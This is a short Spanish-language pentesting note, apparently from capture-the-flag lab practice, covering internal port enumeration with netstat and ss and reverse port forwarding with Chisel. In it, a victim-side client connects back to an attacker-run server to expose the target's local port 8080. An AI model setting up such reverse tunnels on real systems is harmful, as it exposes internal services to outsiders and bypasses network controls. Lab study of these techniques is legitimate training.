- Tags : #enumeration #enumeration_puertos_internos #recursos #recursos_hackerlabs #port_forwarding #chisel 

**Recursos**: Maquina Sedition the hacker labs


```bash
#Enumeracion de puertos en linux
netstat -tulpn

ss -tulpn
```

# Port Forwarding con Chisel
**Recurso**: Maquina Interna TryHackMe
*Chisel repo* : [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

Para utilizar chisel debemos establecer un servidor y un cliente con est para que se comunique

```bash
#Atacante
./chisel server --reverse -p 8001

#Victima
./chisel client ip_servidor_chisel:8001 R:443:127.0.0.1:8080

#Explicamos el comando 
./chisel client  #Activa el modo cliente

ip_servidor_chisel:8001 #Indica el ip y puerto del servidor de chisel que esucha

R:443:127.0.0.1:8080 #Le envia atraves del servidor de chisel al puerto 443 de la mquina que corre el servidor, el puerto 8080 de la maquina objetivo  127.0.0.1,localhost

#Desde nuestra maquina podemos entonces ir al puerto 443 y veremos lo que tiene la maquina objetivo en el puerto 8080
```